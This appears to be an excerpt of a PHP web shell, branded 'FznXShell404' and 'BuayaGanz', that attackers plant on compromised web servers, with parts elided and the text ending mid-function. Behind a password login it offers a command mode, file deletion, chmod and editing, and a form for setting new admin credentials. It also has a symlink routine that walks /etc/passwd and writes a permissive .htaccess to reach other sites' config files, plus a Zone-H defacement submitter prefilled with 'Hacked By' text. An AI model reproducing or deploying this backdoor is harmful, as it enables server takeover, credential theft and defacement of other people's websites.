...
<html>
<head>
	<title>Kang Tikung</title>
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<body bgcolor="black">
	<center><img src="https://i.ibb.co/RCdZ2C6/IMG-20210407-WA0581.jpg" style="opacity:0.5; width:300px; height:300px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">-=[ Welcome To</font><font color="white" face="Patrick Hand"> LAMMER BLACKHAT ]=-</font><br>
</center>
<center><audio autoplay="autoplay" controls="controls" src="https://l.top4top.io/m_19236u3zb2.mp3" type="audio/mpeg"></audio></center>


	<form method="post">
		<input type="password" name="password" placeholder="PASSWORD">
      <input type="submit" value="GAS TOD-!!">
		<br>
		<br>
...
<title>WELCOME TO BuayaGanz</title>
<meta property="og:image" src="https://i.ibb.co/RCdZ2C6/IMG-20210407-WA0581.jpg"/>
<style>
body{
...
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">xXx  WELCOME TO BUAYA GANZ xXx</font><br>
</h1></center>
<center><b><font face="courier new" color="white" size="5">“ Hai Kang Tikung Shell Orang:v ”</font></b></center>
<marquee><b><fonte face="courier new" color="white" size="4">LammerBlackHat - JAVA CYBER ARMY - JAKARTA BLACKHAT CYBER CRIME - JAKARTA INDONESIAN DARKNET - GAP FINDER INDONESIA - INDONESIAN OFFENSIVE SECURITY</font></b></marquee>
<center><audio autoplay="autoplay" controls="controls" src="https://l.top4top.io/m_19236u3zb2.mp3" type="audio/mpeg"></audio></center>
<table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<tr><td><font color='white'>
+ IP Kamu Beb    <td>: <font color='lime'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
...
+ Coded By   <td>: <font color='lime'> ./BuayaGanz404<tr><td><font color='white'>
+ Message  <td>: <font color='lime'>- FROM LAMMER TO HAXOR -</font></tr></td><br>
</table>";
...
<input type="submit" value="Entodd:v" style="margin-top:4px;width:150px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;border-radius:5px"/><br><br>
</form></center>';
echo "</td></tr>";
echo "</table>";
echo "<center>";
...
if($_GET['do'] == 'cmd') {
	...
	<form action="#" method="post"> 	 <input type="email" name="email" placeholder="Gmail Lu" /> 	 <input type="submit" name="submit" value="Crack"/> 	 
	</form> 	 	 
	<br/><br/><br/> 
	...
	</center>"; } else { echo "<center>Ini Username Nya Salin Dulu, Trus Lu Ewek:v<br><br>
	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Pencet Ini Ya beb:)</a><br><br></center>'; ;}}
	echo '</td></tr><tr><td>';
	}
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='./FznXploit404'><br>
		<u>Domains</u>: <br>
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By /FznXploit404</textarea><br>
	<input type='submit' name='start' value='ENTOD Cuk' style='width: 450px;'>
	</form></center>";
	} 
	}elseif($_GET['to'] == 'sym') {
echo '<hr>';
...
echo "</div>";
   ...
   <input type='text' name='d_file' value='Hapus Aja Kenangan Lu Sma dia:v..' style='width: 450px;' height='10'><br>
   ...
   $idx = mkdir("./FznXploit_CONFIG", 0777);
   $isi_htc = "Options all\nRequire None\nSatisfy Any";
   $htc = fopen("./FznXploit_CONFIG/.htaccess","w");
   fwrite($htc, $isi_htc);
   while($passwd = fgets($etc)) {
   if($passwd == "" || !$etc) {
 ...
 Set User & Pass: <br>
 <input type='text' name='user_baru' value='./FznXploit' placeholder='user_baru'><br>
 <input type='text' name='pass_baru' value='./FznXploit' placeholder='pass_baru'><br>
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
   ...
   <td>
   <center>
   <h2 style='color'blue'>FznXShell404</font></h2>
   <p style='color: white;'>GreetZ:</p>
   <font color="cyan">[</font>
   <marquee behavior="alternate" scrollamount="10" style="width: 40%;">LammerBlackHat - JAVA CYBER ARMY - JAKARTA BLACKHAT CYBER CRIME - JAKARTA INDONESIAN DARKNET - GAP FINDER INDONESIA - INDONESIAN OFFENSIVE SECURITY</marquee>
   <font color="cyan">]</font>
   <p>./BuayaGanz404</p>
   </center>
   </td>
...
echo '<script> alert("EDIT GAGAL TOD !!!!!")</script></font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
...
<input type="submit" value="Entod" style="margin-top:4px;width:500px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver;border-radius:5px"/>
</form>';
}
echo '</center>';
}else{
...
echo '<font color="red">File Gagal Dihapus Tod</font><br/>';
}
}
}
echo '</center>';
...
<tr class="first">
<td class="pl"><center><font>Nama File Lu</peller></center></td>
<td class="pl"><center><font>Ukuran File</peller></center></td>
<td class="pl"><center><font>./BuayaGanz404</peller></center></td>
<td class="pl"><center><font>Aksi Lu:v</peller></center></td>
</tr>';
...
<option value="">Pilih Tod</option>
<option value="delete">Hapus</option>
<option value="chmod">Chmod</option>
<option value="rename">Edit Files</option>
</select>
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">Copyright &copy;2021 " ./BuayaGanz " </center>
</body>
</html>';
function perms($file){
